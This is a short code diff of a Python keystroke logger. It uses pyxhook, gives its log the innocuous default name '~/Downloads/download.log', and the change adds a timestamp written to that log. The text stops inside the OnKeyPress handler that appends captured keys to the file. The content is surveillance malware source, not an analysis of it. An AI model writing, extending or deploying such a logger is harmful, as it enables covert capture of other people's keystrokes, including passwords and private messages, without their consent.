@@ -1,10 +1,16 @@
 import os
 import pyxhook
+from datetime import datetime
 
 log = os.environ.get(
     'pylogger_file',
     os.path.expanduser('~/Downloads/download.log')
 )
+
+timi = datetime.now()
+
+with open (log, 'a') as f:
+    f.write(str(timi) + '\n')
 
 def OnKeyPress(event):
     with open(log, 'a') as f:
